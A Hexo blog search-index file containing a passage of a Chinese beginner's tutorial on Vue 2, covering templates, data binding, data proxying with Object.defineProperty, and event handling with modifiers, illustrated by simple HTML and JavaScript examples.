<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>vue</title>
    <link href="/2023/11/21/2023/vue/"/>
    <url>/2023/11/21/2023/vue/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章：Vue核心（开始）"><a href="#第一章：Vue核心（开始）" class="headerlink" title="第一章：Vue核心（开始）"></a>第一章：Vue核心（开始）</h1><h2 id="什么是vue？"><a href="#什么是vue？" class="headerlink" title="什么是vue？"></a><strong>什么是vue？</strong></h2><blockquote><p>Vue (发音为 &#x2F;vjuː&#x2F;，类似 <strong>view</strong>) 是一款用于构建用户界面的 JavaScript 框架。它基于标准 HTML、CSS 和 JavaScript 构建，并提供了一套声明式的、组件化的编程模型，帮助你高效地开发用户界面。无论是简单还是复杂的界面，Vue 都可以胜任。</p></blockquote><p>VUE是一套用于<u>构建用户界面</u>的渐进式JavaScript<strong>框架</strong>。</p><p>开发者：尤雨溪</p><p>特点：</p><ol><li>采用组件化模块。提高代码复用率、且让代码更好维护</li><li>声明式编码。编程人员无需直接操作DOM，提高开发效率。</li><li>使用虚拟DOM + Diff算法。尽量复用DOM节点。</li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li><p>vue开发者工具<a href="https://github.com/vuejs/vue-devtools#vue-devtools">vue-devtools</a></p></li><li><p>vue</p><ol><li><p>直接<code>script</code>引入</p><ul><li><p>[下载<a href="https://v2.cn.vuejs.org/js/vue.js">v2开发版本</a>]</p><p>直接下载并用 <code>&lt;script&gt;</code> 标签引入，<code>Vue</code> 会被注册为一个全局变量</p></li></ul></li><li><p>npm</p><p>在用 Vue 构建大型应用时推荐使用 NPM 安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">最新稳定版</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">npm install vue@^2</span><br></code></pre></td></tr></table></figure></li></ol></li></ul><h2 id="Hello-Vue"><a href="#Hello-Vue" class="headerlink" title="Hello Vue"></a>Hello Vue</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>初识Vue<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 容器 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span> =<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello,&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span>; <span class="hljs-comment">//阻止vue在启动时生成生产提示</span></span><br><span class="language-javascript">    <span class="hljs-comment">// 创建vue实例</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> x = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>, <span class="hljs-comment">//el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串</span></span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123; <span class="hljs-comment">//存储数据，供el指定容器使用</span></span><br><span class="language-javascript">            <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Vue&#x27;</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-11-23%20%E4%B8%8A%E5%8D%881.34.29.png" alt="截屏2023-11-23 上午1.34.29" style="zoom:50%;" /><p>实例和容器为一对一。</p><p>root容器内的代码被称为Vue模板。</p><ul><li><p><strong>模板</strong></p><p>html中包含了一些js语法代码，语法分为两种：</p><ol><li><p><strong>插值语法</strong>（双大括号表达式）</p><p>功能：用于解析标签体内容。</p><p>语法：<code>&#123;&#123;xxx&#125;&#125;</code>，中的xxx为js表达式。</p></li><li><p><strong>指令</strong>（以v- 开头）</p><p>功能：解析标签属性、解析标签体内容、绑定事件</p><p>语法：例如<code>v-bind:href = &#39;xxxx&#39;</code>，xxxx 会作为 js 表达式被解析</p><ul><li>v-once：只渲染元素和组件一次，之后将视为静态内容跳过。</li></ul></li></ol></li><li><p>数据绑定</p><ul><li><p><strong>单向数据绑定</strong>：<code>x-bind:</code> ，可缩写为<code>:</code></p><p>数据只能从data流向页面</p></li><li><p><strong>双向数据绑定</strong>：<code>x-model:</code></p><p>数据能从data流向页面，也能从页面流向data。</p><p>一般用在表单类元素上。</p><p><code>x-model:value</code> 可以缩写为<code>x-model:</code>，因为它默认收集value。</p></li></ul></li><li><p>el的两种写法</p><ol><li>new Vue时直接配置el属性</li></ol>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>  <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,<br>  <span class="hljs-attr">data</span>:&#123;<br>    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Vue&#x27;</span><br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><ol start="2"><li><p>先创建Vue实例，随后使用<code>$mount</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> v = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br><span class="hljs-comment">// el:&#x27;#root&#x27;,</span><br><span class="hljs-attr">data</span>:&#123;<br><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Vue&#x27;</span><br>&#125;<br>&#125;)<br>v.$mount(<span class="hljs-string">&#x27;#root&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ol></li><li><p>data的两种写法</p><ol><li><p>对象式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>    <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,<br>    <span class="hljs-attr">data</span>:&#123;<br>        <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;vue&#x27;</span><br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>函数式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>    <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,<br>    <span class="hljs-attr">data</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-comment">//可简写为data()</span><br>        <span class="hljs-keyword">return</span>&#123;<br>            <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Vue&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>此处data的this是Vue实例对象。（不能写为箭头函数，因为this为全局window）</p></li></ol></li></ul><h2 id="MVVM"><a href="#MVVM" class="headerlink" title="MVVM"></a>MVVM</h2><p> <strong>MVVM(Model-view-viewmodel)</strong> 是一种软件架构模式。</p><p>M：模型——对于data中的数据 </p><p>V：视图——模板  （DOM）</p><p>VM：视图模型——Vue实例对象</p><blockquote><p>虽然没有完全遵循 <a href="https://zh.wikipedia.org/wiki/MVVM">MVVM 模型</a>，但是 Vue 的设计也受到了它的启发。因此在文档中经常会使用 <code>vm</code> (ViewModel 的缩写) 这个变量名表示 Vue 实例。</p></blockquote><p>vm身上的所有属性，及Vue原型上的所有属性，在Vue模板中都可以直接使用</p><h2 id="数据代理"><a href="#数据代理" class="headerlink" title="数据代理"></a>数据代理</h2><h3 id="Object-defineProperty"><a href="#Object-defineProperty" class="headerlink" title="Object.defineProperty()"></a>Object.defineProperty()</h3><p><strong><code>Object.defineProperty()</code></strong> 静态方法会直接在一个对象上定义一个新属性，或修改其现有属性，并返回此对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> person = &#123;<br>    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;张三&#x27;</span>,<br>    <span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;男&#x27;</span><br>&#125;<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(person,<span class="hljs-string">&#x27;age&#x27;</span>,&#123;<br>    <span class="hljs-attr">value</span>:<span class="hljs-number">18</span><br>&#125;)<br></code></pre></td></tr></table></figure><p>此处的age不可枚举（可使用<code>Object.keys(person)</code>验证），也不可直接更改，也不可直接删除。</p><ul><li>若想使age也<strong>可枚举</strong>，添加<code>enumerable:true</code>。</li><li>若想使age可<strong>更改</strong>，添加<code> writable:true</code>。</li><li>若想使age可<strong>删除</strong>，添加<code>configurable:true</code>。</li></ul><p>如果想实现，给person添加一个属性age，但值为变量number的值，可以使用**<code>get</code>**。这样修改number时，age的值会跟着改变。</p><p>想要修改age值，可以使用**<code>set</code>**，修改age值时，number会随之改变（反之亦然）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> number = <span class="hljs-number">18</span>;<br><span class="hljs-keyword">let</span> person = &#123;<br>    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;张三&#x27;</span>,<br>    <span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;男&#x27;</span><br>&#125;<br><span class="hljs-comment">//当有人读取person的age属性时，get函数（getter）就会被调用，返回值就是age的值</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(person,<span class="hljs-string">&#x27;age&#x27;</span>,&#123;<br>    <span class="hljs-attr">get</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-comment">//可缩写为get()</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;有人读取age属性了&#x27;</span>)<br>        <span class="hljs-keyword">return</span> number<br>    &#125;<br><span class="hljs-comment">//当有人修改person的age属性时，set函数（setter）就会被调用，且会收到修改的具体值</span><br>    <span class="hljs-attr">set</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>)&#123;<span class="hljs-comment">//可缩写为set()</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;有人修改了age属性，且值是&#x27;</span>,value)<br>        number = value<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="数据代理-1"><a href="#数据代理-1" class="headerlink" title="数据代理"></a>数据代理</h3><p>数据代理：通过一个对象代理对另一个对象中属性的操作（读&#x2F;写）。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> obj = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">100</span>&#125;<br><span class="hljs-keyword">let</span> obj2 = &#123;<span class="hljs-attr">y</span>:<span class="hljs-number">200</span>&#125;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(obj2,<span class="hljs-string">&#x27;x&#x27;</span>,&#123;<br>    <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span> obj.<span class="hljs-property">x</span><br>    &#125;,<br>    <span class="hljs-title function_">set</span>(<span class="hljs-params">value</span>)&#123;<br>        obj.<span class="hljs-property">x</span> = value<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>vue数据代理：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;尚硅谷&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">address</span>:<span class="hljs-string">&#x27;宏福科技园&#x27;</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>data中的数据，可通过vm调用。例如vm.name,vm.address。</p><p>而<code>data = options.data = vm._data</code>。<code>vm._data.name = vm.name</code>。</p><p>修改vm.name时，使用setter方法。</p><p>总结：</p><ul><li>Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读&#x2F;写）</li><li>vue中数据代理的好处：更加方便的操作data中的数据</li><li>基本原理<ul><li>通过Object.defineProperty()把data对象中所有属性添加到vm上</li><li>为每一个添加到vm上的属性，都制定一个getter&#x2F;setter</li><li>在getter&#x2F;setter内部去操作(读&#x2F;写)data中对应的属性</li></ul></li></ul><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-11-23%20%E4%B8%8B%E5%8D%884.49.51.png" alt="图示理解"></p><h2 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h2><h3 id="v-on"><a href="#v-on" class="headerlink" title="v-on"></a>v-on</h3><p><strong><code>v-on:xxx</code> 绑定事件</strong>（可简写为<code>@:xxx</code>）</p><p>例如：<code>v-on:click=&quot;showInfo&quot;</code>,点击调用showInfo函数。</p><p>事件的回调需要配置在methods对象中，最终会在vm上。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;学习<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showInfo1&quot;</span>&gt;</span>点我提示信息1（不传参）<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showInfo2(666,$event)&quot;</span>&gt;</span>点我提示信息2（传参）<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Vue校园&#x27;</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">showInfo1</span>(<span class="hljs-params">event</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-comment">// console.log(event.target.innerText)  </span></span><br><span class="language-javascript">              <span class="hljs-comment">//控制台显示’点我提示信息‘</span></span><br><span class="language-javascript">                <span class="hljs-comment">// console.log(this) </span></span><br><span class="language-javascript">              <span class="hljs-comment">//此处的this是vm </span></span><br><span class="language-javascript">                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;同学你好&#x27;</span>)</span><br><span class="language-javascript">            &#125;,                </span><br><span class="language-javascript">            <span class="hljs-title function_">showInfo2</span>(<span class="hljs-params">number,event</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(number,event) <span class="hljs-comment">//666  鼠标Event</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="事件修饰符"><a href="#事件修饰符" class="headerlink" title="事件修饰符"></a>事件修饰符</h3><ol><li><p><strong>prevent</strong>：阻止默认事件</p><p>等同于<code>e.preventDefault()</code>。</p></li><li><p><strong>stop</strong>：阻止事件冒泡</p><p>等同于<code>e.stopPropagation()</code>。</p></li><li><p><strong>once</strong>：事件只触发一次</p><p>注意：和v-once不是同一个概念</p></li><li><p><strong>capture</strong>：使用事件的捕获模式</p></li><li><p><strong>self</strong>：只有event.target是当前操作的元素时才触发事件</p></li><li><p><strong>passive</strong>：事件的默认行为立即执行，无需等待事件回调执行完毕</p></li></ol><p>*修饰符可以连续写，例如@click.stop.prevent，表示先阻止冒泡，再阻止默认事件</p><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs html">    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        *&#123;</span><br><span class="language-css">            <span class="hljs-attribute">margin</span>:<span class="hljs-number">20px</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.demo1</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">background-color</span>: skyblue;</span><br><span class="language-css">        &#125;        </span><br><span class="language-css">        <span class="hljs-selector-class">.box1</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">background-color</span>: skyblue;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.box2</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">background-color</span>: orange;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.list</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">background-color</span>: peru;</span><br><span class="language-css">            <span class="hljs-attribute">overflow</span>: auto;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-tag">li</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;学习<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 阻止默认事件(常用) --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span> @<span class="hljs-attr">click.prevent</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 阻止事件冒泡（常用） --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo1&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click.stop</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 事件只触发一次 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click.once</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 使用事件的捕获模式 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;box1&quot;</span> @<span class="hljs-attr">click.capture</span>=<span class="hljs-string">&quot;showMsg(1)&quot;</span>&gt;</span><br>        div1<br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;box2&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showMsg(2)&quot;</span>&gt;</span><br>            div2 <br>            <span class="hljs-comment">&lt;!-- 点击后控制台输出1 2 --&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 只有event.target是当前操作的元素时才触发事件 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo1&quot;</span> @<span class="hljs-attr">click.self</span>=<span class="hljs-string">&quot;showInfo2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showInfo2&quot;</span>&gt;</span>点我提示信息<span 